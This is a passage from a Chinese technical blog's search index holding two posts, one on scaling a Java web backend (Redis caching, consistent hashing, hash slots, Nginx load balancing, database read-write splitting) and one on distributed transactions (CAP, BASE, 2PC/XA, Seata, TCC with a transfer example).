src="https://tva1.sinaimg.cn/large/008vxvgGly1h8gbhfx29ej30g30gpwfe.jpg" alt="image-20221124165341727"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Filter </tag>
            
            <tag> Interceptor </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>后端风云</title>
      <link href="/2022/11/25/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%90%8E%E7%AB%AF%E9%A3%8E%E4%BA%91/"/>
      <url>/2022/11/25/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%90%8E%E7%AB%AF%E9%A3%8E%E4%BA%91/</url>
      
        <content type="html"><![CDATA[<h1 id="后端风云"><a href="#后端风云" class="headerlink" title="后端风云"></a>后端风云</h1><p>​        本文简单概况了一下刘欣老师的《码农翻身》的后端风云章，这本书强烈推荐给大家，每看一遍都有不同的感觉，通俗易懂且知识面大而全。居家旅行，必备良药！！！</p><h2 id="早期初级阶段："><a href="#早期初级阶段：" class="headerlink" title="早期初级阶段："></a>早期初级阶段：</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek1qz02j30ly0bcaal.jpg" alt="image-20220820220959059"></p><p>​        在我们早期学习 <code>javaWeb</code>阶段，将订单模块儿，购物车模块儿，支付模块儿都写在了一个项目中，并访问一个Mysql数据库，这在自己练手项目中是没问题的，但如果系统上线，有大量的用户同时访问该系统，Tomcat服务器首先需要考虑能不能支撑住大的并发量（默认150，当超过250时，就应该考虑的服务器的集群），其次是Mysql数据库,在高并发两三千也就差不多了，要知道Mysql数据库读取数据是很慢的操作，它本质是从硬盘中读取文件的。</p><h2 id="优化点1-使用缓存"><a href="#优化点1-使用缓存" class="headerlink" title="优化点1:使用缓存"></a>优化点1:使用缓存</h2><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejxz2vfj30kn06raaf.jpg" alt="image-20220820120628253"></p><p>可以看到我们给中间加了一个Redis中间件作为缓存，现在服务器需要获取数据，先到缓存中找数据，如果找不到再去Mysql中找数据，找到数据后再写回Redis中，这样下次请求数据可以直接在缓存中获取数据，那缓存的好处是啥，缓存是加载在内存中的，读取数据那肯定是快的多。这样就减轻Mysql数据库的压力。但是如果用户每次请求先去缓存找，如果都没找到，那请求还是落在了Mysql上，这个可能导致缓存击穿，缓存雪崩。</p><blockquote><p>提问：如果数据库中数据修改了，但是缓存中还是之前的数据该怎么办？</p><p>为了保证数据的一致性下面的方案是否可行？</p><ol><li>先更新数据库中，再更新缓存</li><li>先删除缓存，再更新数据库</li><li>先更新数据库，再删缓存</li><li>数据设置过期时间</li></ol><p>这里参考文章：<a href="https://blog.csdn.net/diweikang/article/details/94406186">https://blog.csdn.net/diweikang/article/details/94406186</a></p></blockquote><h2 id="优化点2-多台缓存"><a href="#优化点2-多台缓存" class="headerlink" title="优化点2:多台缓存"></a>优化点2:多台缓存</h2><p>之前我们在服务器与数据库中间加上一个缓存，来减轻数据库的压力，和提高数据读取速度，但如果只有一台缓存，后期也会因为内存用完而耗尽，缓存要是挂机了，又是数据库直面大量请求了，那我们多部署几个缓存服务器来分摊一下压力。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek34irtj30pc09ugmh.jpg" alt="image-20220820131146797"></p><p>当部署多个缓存服务器时，又出现问题了，我读取和存放数据的时候，我用哪个服务器啊，我们先不说具体用啥算法，我们先想想我们需要啥？</p><ol><li>我存的地方和我找的地方得一致，不能我存在缓存1，结果去缓存3找，那肯定是没数据</li><li>我存放数据的均匀的落在这三个缓存上，不能说饿的饿死，撑得撑死。</li></ol><h3 id="余数算法"><a href="#余数算法" class="headerlink" title="余数算法"></a>余数算法</h3><p>最简单：在找数据或者写数据时，先求Hash值，然后对Hash值进行取余，这样可以均匀的将请求落在三个缓存中。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek0ropij30i007z74w.jpg" alt="image-20220820162701218"></p><p>​        缺点也很明显：之前我用三个缓存好好的，数据存储的也没问题，现在要再加一个缓存，那现在读数据和写数据取余可就变成4了，之前的数据可就都访问不到了，请求一下子又干到数据库了</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejv7pnhj30n507qgmi.jpg" alt="image-20220820162729067"></p><h3 id="一致性Hash算法"><a href="#一致性Hash算法" class="headerlink" title="一致性Hash算法"></a>一致性Hash算法</h3><p>一致性Hash算法不能完全的解决这个问题，但是可以做到大部分数据可以照常工作</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek2n3qfj30j70c174f.jpg" alt="image-20220820163202097"></p><p>​        比方说我们在这个圆上标注 <code>0-2^32-1</code>个点，三台redis服务器均匀的落在这个图上，当有数据要查找或插入时，还是先取Hash值，使落在这个圆的范围上，如果超出了那就取余。比方说这是插入的这个点落在了A到B之前的位置，那就让它顺时针找它最近的那个服务器点，数据存放在那里，这时候就找到了B，如果是落在了C到A的范围，那还是顺时针走，走到A的位置。</p><p>​        假如说突然又添加了一个服务器D，假如插在了B和C之间。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek18qiqj30i70c374j.jpg" alt="image-20220820163842694"></p><p>​        那么现在要查询数据时，点位落在了B到C之前，原来是到C去读取数据，现在就看是不是在B和D之间了，如果在这之间那就去D找，如果落在了D到C之间，那还是去C找。这时候就发现到D找的数据肯定是找不到的，但是其他区域的数据都不会被影响到啊，这样就避免了全部缓存穿透导致的缓存雪崩。</p><blockquote><p>这里的一个前提条件就是服务器经过Hash计算后需要均匀的落在这个区间内，否则就会有部分的缓存负责过高，有的负载过低，也就是<code>数据倾斜</code></p></blockquote><p>​        比方说我们个人开发的小项目，就用两个缓存服务器，那这么大的一个圆就放两个点，可能导致数据都集中到了一个服务器上，导致压力过大</p><blockquote><p>解决这个问题的办法有：<code>虚拟服务器（虚拟节点映射）</code></p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejvpj1aj30lg0iemys.jpg" alt="image-20220820165011054"></p><p>就是将一个真实服务器看做成多态虚拟的服务器，均匀的分布到圆上。</p><p>保证数据均匀的存放在真实的缓存服务器上</p><h3 id="Hash槽算法"><a href="#Hash槽算法" class="headerlink" title="Hash槽算法"></a>Hash槽算法</h3><p>槽可以理解为分区，数据都是存放在分区中的，然后分区与机器进行动态绑定。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejyvqptj30m906sgm7.jpg" alt="image-20220820200524038"></p><p>​        比方说现在要存储(Key,Value),先对Key求Hash值，然后对16384求余数，看到余数落在那个槽位，就放到哪个服务器。是不是感觉第三种算法和余数算法和一致性Hash算法都有点儿像，类似于一个综合的算法</p><p>​        那假如我现在要新增一个节点怎么办，现在有三个服务器，假如再来一个服务器4，就从服务器1，服务器2，服务器3中各取出一部分槽和数据。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejyfi27j30ml0b5759.jpg" alt="image-20220820201220590"></p><p>​        那相应的我请求请求的时候选择哪个节点，这里客户端可以向任意一个节点发送请求，例如：get(key1)这个请求我发送给了服务器1，但是数据是在服务器2，则服务器会将请求重定向到服务器2。这也叫做<code>Redis Cluster</code></p><blockquote><p>为什么redis集群不采用一致性哈希算法？</p></blockquote><p>​        一个直观的区别就是一致性Hash，无法很好的控制数据的分布，比方说我是有几个服务器，但是各个硬件条件并不一样，想让配置比较好的多放一些数据，配置差点儿的就少部署一些，可以做到精确控制。</p><h2 id="优化点3-故障转移"><a href="#优化点3-故障转移" class="headerlink" title="优化点3:故障转移"></a>优化点3:故障转移</h2><p>​        比方说我原先有三个缓存服务器，每个服务器负责一部分Hash槽，假如这时候一个服务器挂了，那这部分数据就算丢失了，这部分的请求也就又干到数据库了，现在我们利用Redis提供的 <code>master-slave</code>功能，就是一个大哥带几个小弟，如果大哥被干掉了，小弟中一个人就去当大哥管事儿。大哥与小弟之前的数据是同步的，以确保小弟可以顺利的继位</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek4j9zfj30n50f00u4.jpg" alt="image-20220820205141078"></p><h2 id="优化点4-高可用的Tomcat"><a href="#优化点4-高可用的Tomcat" class="headerlink" title="优化点4:高可用的Tomcat"></a>优化点4:高可用的Tomcat</h2><p>​        在文章的最开始我们就说了Tomcat默认支持的并发量并不大，且如果它挂掉了，那完蛋了，服务直接用不了了，所以索性我们学习一下Redis，多部署几个Tomcat服务器，让请求均摊到各个Tomcat服务器之间，这样就可以有效的降压，如果有一个服务器挂了，其他的服务器还能继续干。</p><blockquote><p>问题：Tomcat的Session信息是不能服务共享的，假如用户A在Tomcat服务器1上进行登陆了，并将登陆信息保存在Session中，现在用户又请求了，被轮训到了服务器2上，但是服务器2是没有该用户的Session信息的，这又得让用户去登陆</p></blockquote><p>可以使用Redis缓存来处理。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejzumt3j30f80a574n.jpg" alt="image-20220820211730816"></p><h2 id="优化点5-使用Nginx"><a href="#优化点5-使用Nginx" class="headerlink" title="优化点5:使用Nginx"></a>优化点5:使用Nginx</h2><p>其实在之前我一直对Nginx都是懵逼状态，明明可以直接访问Tomcat，为啥要中间加一个Nginx。我对Nginx最直观的使用就是通过端口去访问服务器静态文件，去做个人博客，但现在按照我们优化点4所说的部署多个Tomcat服务器，那前端到底访问哪个Tomcat呢？总不能写死到前端代码里去轮询吧，如果我们在中间加一个Nginx去做代理，就会舒服的多。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejx1jhgj30s00agdgt.jpg" alt="image-20220820212437837"></p><p>这里我就不说文绉绉的定义了，可以去官网上查</p><h3 id="正向代理"><a href="#正向代理" class="headerlink" title="正向代理"></a>正向代理</h3><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejw7k9mj30jm0eujsa.jpg" alt="image-20220820212745193"></p><p>​        这里说一个例子就行了，VPN翻墙，你想访问国外网址，但是电脑受国内管控，无法访问，那就需要一个代理，你请求代理，代理请求国外服务器，然后数据返回。</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek2729wj30jt0dmab1.jpg" alt="image-20220820213214154"></p><p>比方说我们现在上网搜索<a href="http://www.baidu.com,我们只知道这个域名,但实际上它可能只是一个代理,真实的请求是转发到内部的其他服务,这样也可以保护真实的服务器.和正向代理的区别是,正向代理是知道我要找谁,反向代理是我也不知道谁真实的服务./">www.baidu.com,我们只知道这个域名，但实际上它可能只是一个代理，真实的请求是转发到内部的其他服务，这样也可以保护真实的服务器。和正向代理的区别是，正向代理是知道我要找谁，反向代理是我也不知道谁真实的服务。</a></p><h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>就是将请求均匀的发送到各个服务器间</p><p>其中有轮训方式</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek50a64j30h70by3z5.jpg" alt="image-20220820213520428"></p><p>有权重方式</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek3l5l8j30jx0d9dgq.jpg" alt="image-20220820213640770"></p><h3 id="动静分离"><a href="#动静分离" class="headerlink" title="动静分离"></a>动静分离</h3><p>很直观的，我们可以通过Nginx直接访问静态文件。那Tomcat也可以访问静态文件啊，但是低，且一般Tomcat是作为业务逻辑服务器的，如果将动态资源和静态资源都放在Tomcat中，就会消耗额外的一部分性能，</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejxhy9fj30k80c9mxr.jpg" alt="image-20220820214118620"></p><h3 id="高可用的Nginx"><a href="#高可用的Nginx" class="headerlink" title="高可用的Nginx"></a>高可用的Nginx</h3><p>​        我们已经发现如果一条链路中如果某个地方只有一个工作的，那一旦它挂机了，后续工作都无法进行了。所以按照之前的设计我们再部署一个Nginx服务器，但是与Tomcat不同的是，Nginx是直面客户端的，所以即使是多个服务，对外也只能暴露一个Ip地址，从外面看就只有一个服务，通过 <code>Keepalived</code>将多个Nginx服务形成<code>master-slave</code>关系，一个挂了，另一个补上，那我们的结构图又得更新了。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejut0lgj30sm09ejsf.jpg" alt="image-20220820214735780"></p><h2 id="优化点6-数据库的读写分离"><a href="#优化点6-数据库的读写分离" class="headerlink" title="优化点6:数据库的读写分离"></a>优化点6:数据库的读写分离</h2><p>​        我们看上面的系统架构图后发现似乎就剩数据库是孤家寡人了，但如果把数据多部署几个，如果每个都可以进行读写操作，那服务之间的数据一致性就很难再确定了，而对数据库的大部分操作都是读操作，写操作相比要少的多。而且我们都知道数据库的共享锁和写锁互斥，这也是影响效率的，如果能分开的话，速度方面，安全方面肯定更稳健。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek0a4fcj30cu0c3gm3.jpg" alt="image-20220820215503380"></p><p>假如有一天master挂掉了，那在剩余的slave中选一个，是不是就发现，多服务部署的思想很多都是一样的。就是为了保证高可用性。</p><blockquote><p>但是Tomcat可就犯难了，难倒我每次请求前都判断一下是读操作还是写操作，再根据不同的类型，发送不同的数据库吗？</p></blockquote><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejwlg47j30gs09i3z1.jpg" alt="image-20220820215954215"></p><h3 id="使用MySQL-Proxy"><a href="#使用MySQL-Proxy" class="headerlink" title="使用MySQL Proxy"></a>使用MySQL Proxy</h3><p>发挥我们抽象的大脑，只要有这种不属于我们应该管的事，我们就把活儿抛出去，我们再增加一个抽象层。将这些脏活累活统一交给Mysql Proxy去管理</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hejzd2b8j30h60dzt9l.jpg" alt="image-20220820220324413"></p><h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>我们的系统已经可见性的复杂的多了，但为了保证服务不会突然挂掉了，这些也是必须的。至于后期还有更多的优化，例如ES，MQ，熔断降级，分布式注册中心，配合中心，等各种骚操作后面再不断加呗，一口吃不成胖子。</p><p><img src="https://tva1.sinaimg.cn/large/008vxvgGly1h8hek414svj30jr0f4gmy.jpg" alt="image-20220820220832414"></p>]]></content>
      
      
      <categories>
          
          <category> 分布式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>分布式事务</title>
      <link href="/2022/11/25/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"/>
      <url>/2022/11/25/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>我们在过去总是使用本地事务，也就是数据库提供的事务操作，其中具有ACID的特性，但在如今我们的各个模块儿被拆分，服务与服务间相互调用，简单来说就是需要跨进程的事务，我们来想一下现有的本地事务是否能解决分布式事务。<br />情况1：<br /><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/25523017/1668658454015-2c3bcf65-a65a-457c-8a58-8831a5945581.jpeg"><br />用户直接调用订单模块儿，开启事务，然后在订单表中存入数据，然后再远程调用物流模块儿，去操作物流模块儿，我们可以想到如果物流模块儿出现问题，订单模块儿远程调用发生错误，是会进行事务回滚的。应该是没问题的。那如果物流模块儿确实修改成功了，但网络传输出现了问题，订单模块儿就进行回滚了，则就导致了物流模块儿有数据，订单模块儿没数据的问题。我们再考虑下面的问题：<br />情况二：<br /><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/25523017/1668658434576-99fb7b4e-5e79-4129-9ec5-23afa89e97a3.jpeg"><br />情况三：<br /><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/25523017/1668658619973-7c51359b-f424-46b3-8bf8-1c8075549245.jpeg"></p><p><a name="ZNo2K"></a></p><h2 id="前提理论"><a href="#前提理论" class="headerlink" title="前提理论"></a>前提理论</h2><p><a name="fbcqR"></a></p><h3 id="CAP理论"><a href="#CAP理论" class="headerlink" title="CAP理论"></a>CAP理论</h3><p>CAP表示一致性，可用性，分区容忍性。下面我们用数据库读写分离来演示</p><blockquote><p>整体执行流程如下： </p></blockquote><p>1、商品服务向主数据库写入商品信息（添加商品、修改商品、删除商品） <br />2、主数据库向商品服务响应写入成功。 <br />3、商品服务请求从数据库读取商品信息。 </p><h4 id="一致性"><a href="#一致性" class="headerlink" title="一致性"></a>一致性</h4><p>表示写操作如果成功，各个节点上的读操作，应能读到最新的数据。</p><blockquote><p>那么应如何保证？</p></blockquote><ol><li>在写入主数据库后应立刻将数据同步到从数据库中</li><li>在同步期间应对从数据库加锁，以防止读取到过期的数据</li></ol><p>那这就存在一定的问题：比如加锁后的性能损耗。</p><h4 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h4><p>指的是任何事务操作都能得到响应结果，不会出现响应超时，响应错误的问题。也就是说我允许我读到之前的数据，但不允许接收不到数据</p><blockquote><p>如何保证？</p></blockquote><ol><li>数据还是应从主数据库同步到从数据库</li><li>不能将资源锁定</li><li>可以返回旧数据，甚至是默认数据，但不能返回错误数据或响应超时</li></ol><h4 id="分区容忍性"><a href="#分区容忍性" class="headerlink" title="分区容忍性"></a>分区容忍性</h4><p>在微服务中数据分布到各个节点中，在网络分区中，允许因为网络问题导致的节点通信失败，但该节点应能继续对外提供服务，举例：1. 主数据库向从数据库同步失败，不能影响节点的读写操作 2. 其中一个节点挂了不能影响另一个。</p><blockquote><p>如何操作</p></blockquote><ol><li>尽量使用异步操作同步数据，让节点松耦合</li><li>多添加从节点，保证备份节点</li></ol><p>分区容忍性应该是分布式下最重要的特性。</p><blockquote><p>在CAP理论中，是否三个特性能同时满足？</p></blockquote><p>不能，在分区容忍性必备的情况下，一致性与可用性间存在矛盾，所以应看情况保证CP或者AP的特性。<br />AP特性：放弃一致性，比如订单退款，并不是瞬间让钱到账，而是允许二十四小时内到账。<br />CP特性：保证一致性，数据必须同步到最新状态，比如跨行转账，必须双方都完后事务才算完成。<br />一般情况下，使用的是AP特性，保证服务的可用。</p><h3 id="BASE理论"><a href="#BASE理论" class="headerlink" title="BASE理论"></a>BASE理论</h3><p>BASE 是 Basically Available(<strong>基本可用</strong>)、Soft state(<strong>软状态</strong>)和 Eventually consistent (<strong>最终一致性</strong>)三个短语的缩写。BASE理论是对CAP中AP的一个扩展，通过牺牲强一致性来获得可用性，<code>当出现故障，允许部分功能不可用，但要保证核心功能可用，允许数据在一段时间内是不一致的，但最终要达到一致状态</code>。满足BASE理论的事务，我们称之为“<strong>柔性事务</strong>”。</p><ol><li>基本可用：分布式系统中允许损失部分可用功能，来保证核心功能的可用</li><li>软状态：因为不要求强一致性，所以允许存在一个中间状态，比如订单的支付中，数据同步中等状态，最后改为成功状态。</li><li>最终一致性：就是从中间状态最终一定达到数据一致。<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="分布式事务解决方案—2PC（两阶段提交）"><a href="#分布式事务解决方案—2PC（两阶段提交）" class="headerlink" title="分布式事务解决方案—2PC（两阶段提交）"></a>分布式事务解决方案—2PC（两阶段提交）</h3>2PC也称为两阶段提交，顾名思义是将事务分为两个阶段，准备阶段（Prepare），提交阶段（Commit）。举个栗子：<blockquote><p>张三和李四好久不见，老友约起聚餐，饭店老板要求先买单，才能出票。这时张三和李四分别抱怨近况不如 意，囊中羞涩，都不愿意请客，这时只能AA。只有张三和李四都付款，老板才能出票安排就餐。但由于张三和李四 都是铁公鸡，形成了尴尬的一幕： </p><ol><li>准备阶段：老板要求张三付款，张三付款。老板要求李四付款，李四付款。 </li><li>提交阶段：老板出票，两人拿票纷纷落座就餐。 </li></ol></blockquote></li></ol><p>例子中形成了一个事务，若张三或李四其中一人拒绝付款，或钱不够，店老板都不会给出票，并且会把已收款退回。<br />整个事务过程由事务管理器和参与者组成，店老板就是事务管理器，张三、李四就是事务参与者，事务管理器负责决策整个分布式事务的提交和回滚，事务参与者负责自己本地事务的提交和回滚。 </p><p>而在一些关系型数据库中（Oracle，Mysql）都是支持两阶段提交协议</p><ol><li> 准备阶段（Prepare phase）：事务管理器给每个参与者发送Prepare消息，每个数据库参与者在本地执行事务，并写本地的Undo/Redo日志，此时事务没有提交。（Undo日志是记录修改前的数据，用于数据库回滚，Redo日志是记录修改后的数据，用于提交事务后写入数据文件)，这时候资源是被锁定的。</li><li>提交阶段（commit phase）：如果事务管理器收到了参与者的执行失败或者超时消息时，直接给每个参与者发送回滚(Rollback)消息；否则，发送提交(Commit)消息；参与者根据事务管理器的指令执行提交或者回滚操作，并释放事务处理过程中使用的锁资源。注意:必须在最后阶段释放锁资源。 <blockquote><p>成功情况：</p></blockquote></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668660736361-4025774b-4920-4033-9e7f-f183a071d5ef.png#averageHue=%23cbdbc1&clientId=ua4b99c96-af3c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=234&id=u92e9f54b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=351&originWidth=774&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76567&status=done&style=none&taskId=udcae8025-cfc0-41f3-adda-320dc46226f&title=&width=516" alt="image.png"></p><blockquote><p>失败情况：</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25523017/1668660756667-a0a02751-6014-4819-aca9-e59c44f51c4a.png#averageHue=%23cbdbc1&clientId=ua4b99c96-af3c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=233&id=ub7e03063&margin=%5Bobject%20Object%5D&name=image.png&originHeight=349&originWidth=776&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65947&status=done&style=none&taskId=u3d3a9f7a-ff22-4635-83a5-dd582bb5469&title=&width=517.3333333333334" alt="image.png"><br />为了统一标准减少行业内不必要的对接成本，需要制定标准化的处理模型及接口标准，国际开放标准组织Open Group定义了分布式事务处理模型<strong>DTP</strong>（Distributed Transaction Processing Reference Model）。<br><a name="RMORc"></a></p><h4 id=""><a href="#" class="headerlink" title=""></a><br /></h4><p><a name="w1hfo"></a></p><h4 id="XA方案"><a href="#XA方案" class="headerlink" title="XA方案"></a>XA方案</h4><blockquote><p>DTP模型定义如下角色：<br><strong>AP</strong>(Application Program)：即应用程序，可以理解为使用DTP分布式事务的程序。<br><strong>RM</strong>(Resource Manager)：即资源管理器，可以理解为事务的参与者，一般情况下是指一个数据库实例，通过资源管理器对该数据库进行控制，资源管理器控制着分支事务。<br><strong>TM</strong>(Transaction Manager)：事务管理器，负责协调和管理事务，事务管理器控制着全局事务，管理事务生命周期，并协调各个RM。<strong>全局事务</strong>是指分布式事务处理环境中，需要操作多个数据库共同完成一个工作，这个工作即是一个全局事务。<br>DTP模型定义TM和RM之间通讯的接口规范叫<strong>XA</strong>，简单理解为数据库提供的2PC接口协议，<strong>基于数据库的XA 协议来实现2PC又称为XA方案</strong>。<br>以上三个角色之间的交互方式如下： </p><ol><li>TM向AP提供 应用程序编程接口，AP通过TM提交及回滚事务。 </li><li>TM交易中间件通过XA接口来通知RM数据库事务的开始、结束以及提交、回滚等。 </li></ol></blockquote><p>总结：</p><blockquote><p>整个2PC的事务流程涉及到三个角色AP、RM、TM。AP指的是使用2PC分布式事务的应用程序；RM指的是资源管理器，它控制着分支事务；TM指的是事务管理器，它控制着整个全局事务。 </p></blockquote><p>XA方案的问题：</p><ol><li>需要数据库支持XA协议</li><li>资源锁需要等两个阶段结束才释放，性能差<br><a name="YNc8P"></a><h4 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a><a href="https://seata.io/zh-cn/docs/overview/what-is-seata.html">Seata</a></h4>阿里开源的分布式事务框架，传统2PC的问题在Seata中得到了解决，它通过对本地关系数据库的分支事务的协调来驱动完成全局事务，是工作在应用层的中间件。主要优点是<strong>性能较好</strong>，且<strong>不长时间占用连接资源</strong>，它以高效并且对<strong>业务0侵入</strong>的方式解决微服务场景下面临的<strong>分布式事务问题</strong>，它目前提供AT（2PC）、TCC、SAGA 和 XA 事务模式。<br />第一阶段就将本地事务提交了（提交前需要获取全局事务锁），全局事务管理器统计所有分支事务的结果，如果某个分支出现了异常，在本地事务中有一个<code>UNDO_LOG Table</code>的数据表，记录了之前的数据，修改SQL，修改后的数据。可通过它进行事务的回滚，这里不会产生脏数据就是因为本地事务的提交需要先获取全局事务锁。<br />第二阶段，如果分支事务都成功，则根据事务ID删除<code>undo_log</code>的记录，如果失败，则找到记录进行回滚。<br />这里业务说明官网已经写的很详细了，这里我不再赘述。<br />Seata的核心就是通过undo log文件让已经提交的事务，仍能回滚。<blockquote><p>小结：</p></blockquote></li></ol><p>这里我们介绍了传统的2PC（基于数据库XA协议）和Seata实现2PC的方案。<br />Seata实现的要点：</p><ol><li>全局事务开始使用 @GlobalTransactional标识 。 </li><li>每个本地事务方案仍然使用@Transactional标识。 </li><li>每个数据都需要创建undo_log表，此表是seata保证本地事务一致性的关键。</li><li>TM获取到的XID会通过远程调用时传入。</li></ol><p><a name="V9PXj"></a></p><h3 id="分布式事务解决方案—TCC"><a href="#分布式事务解决方案—TCC" class="headerlink" title="分布式事务解决方案—TCC"></a>分布式事务解决方案—TCC</h3><blockquote><p>TCC与2PC有啥区别？ 为啥使用？</p></blockquote><p>2PC是定义在<code>数据层</code>的，而且有全局锁的存在，也会有一定的性能消耗。TCC是在业务层定义的，更加灵活，但复杂度也会上升，TCC是<code>try，conform，console</code>三个方法的简写。也就是想实现分布式事务，需要实现这三个方法。下面我们使用框架进行演示<br><a name="a5atC"></a></p><h4 id="hmily"><a href="#hmily" class="headerlink" title="hmily"></a><a href="https://gitee.com/dromara/hmily">hmily</a></h4><blockquote><p>TCC需要注意三种异常处理分别是空回滚、幂等、悬挂:** **</p></blockquote><p>这里是指TCC中的<code>try，conform，console</code>是三个独立的线程去完成的，且分布式调用具体网络延迟的可能性。</p><ol><li>空回滚：try还没执行时，执行console。<ol><li>解决思路：我们记录TM生成的全局事务ID，来判断try是否已经执行，如果未执行则不执行console。</li></ol></li><li>悬挂：conform或console已经执行了，才开始执行try<ol><li>解决思路：在conform和console执行时将执行记录插入数据，当执行try时进行判断</li></ol></li><li>幂等性：conform和console都是默认成功的，当执行失败时，会不断重试，这就需要保证代码代码幂等性<ol><li>解决思路：执行前，先通过全局唯一事务ID，查看自己之前是否执行过。</li></ol></li></ol><blockquote><p>这里有一个拓宽的思路，就是在本地事务中，记录一张记录表，来判断操作是否执行过，由于是在同一本地事务内，所以可以保证该记录的准确性。</p></blockquote><p><strong>Try，Console，Conform需要严格处理上面的三个问题，下面我们用业务来说明：</strong><br />**场景为 A 转账 30 元给 B，A和B账户在不同的服务。 **</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 账户A </span><br><span class="line">try：检查余额是否够30元 扣减30元  （操作是直接提交本地事务的）</span><br><span class="line"></span><br><span class="line">confirm： 空 </span><br><span class="line"></span><br><span class="line">cancel：增加30元</span><br><span class="line"></span><br><span class="line">// 账户B</span><br><span class="line">try：增加30元 </span><br><span class="line"></span><br><span class="line">confirm： 空 </span><br><span class="line"></span><br><span class="line">cancel：减少30元</span><br></pre></td></tr></table></figure><p><strong>存在问题：</strong><br />1）如果账户A的try没有执行，执行cancel则就多加了30元。 <br />2）由于try，cancel、confifirm都是由单独的线程去调用，且会出现重复调用，所以都需要实现幂等。 <br />3）账号B在try中增加30元，当try执行完成后可能会其它线程给消费了。 <br />4）如果账户B的try没有执行在cancel则就多减了30元。    <br />**问题解决： **<br />1）账户A的cancel方法需要判断try方法是否执行，正常执行try后方可执行cancel。 <br />2）try，cancel、confifirm方法实现幂等。 <br />3）账号B在try方法中不允许更新账户金额，在confirm中更新账户金额。 <br />4）账户B的cancel方法需要判断try方法是否执行，正常执行try后方可执行cancel。 </p><figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 账户A</span><br><span class="line">try：</span><br><span class="line">try幂等校验，判断之前执行过没</span><br><span class="line">  try悬挂处理，判断conform和cancel执行过没</span><br><span class="line">检查余额是否够30元</span><br><span class="line">扣减30元 </span><br><span class="line"></span><br><span class="line">confirm： 空 </span><br><span class="line"></span><br><span class="line">cancel：</span><br><span class="line">cancel幂等校验 </span><br><span class="line">cancel空回滚处理 </span><br><span class="line">增加可用余额30元</span><br><span class="line"></span><br><span class="line">// 账户B</span><br><span class="line">try：空 </span><br><span class="line"></span><br><span class="line">confirm： </span><br><span class="line">confirm幂等校验 </span><br><span class="line">正式增加30元 </span><br><span class="line"></span><br><span class="line">cancel：空</span><br></pre></td></tr></table></figure><p><a name="ObLOT"></a></p><h3 id="分布式事务解决方案—可靠消息最终一致性"><a href="#分布式事务解决方案—可靠消息最终一致性" class="headerlink" 